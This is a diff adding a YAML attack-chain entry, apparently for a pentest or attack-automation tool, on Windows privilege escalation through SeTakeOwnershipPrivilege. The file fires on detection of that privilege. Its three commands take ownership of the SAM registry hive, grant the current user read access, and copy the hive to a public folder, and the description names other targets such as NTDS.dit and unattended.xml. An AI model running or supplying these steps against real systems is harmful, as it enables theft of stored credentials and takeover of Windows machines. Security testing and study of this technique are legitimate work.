@@ -1,0 +1,30 @@
+chain_id: setakeownership
+title: "Windows privesc — SeTakeOwnershipPrivilege to read protected files"
+severity: HIGH
+tags: [windows, privesc, setakeownership]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeTakeOwnershipPrivilege" }
+
+description: |
+  SeTakeOwnershipPrivilege lets the holder claim ownership of any object,
+  bypassing the existing DACL. From there: rewrite the DACL to grant
+  yourself read, then dump the file. Most useful targets: Administrator
+  profile, NTDS.dit (on a DC), unattended.xml, application secrets.
+
+steps:
+  - id: 1
+    title: "Take ownership of the target"
+    command: takeown /f C:\Windows\System32\config\SAM
+
+  - id: 2
+    title: "Grant yourself read on it"
+    command: icacls C:\Windows\System32\config\SAM /grant USUARIO:(R)
+
+  - id: 3
+    title: "Read it"
+    command: type C:\Windows\System32\config\SAM > C:\Users\Public\SAM.copy
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/setakeownershipprivilege
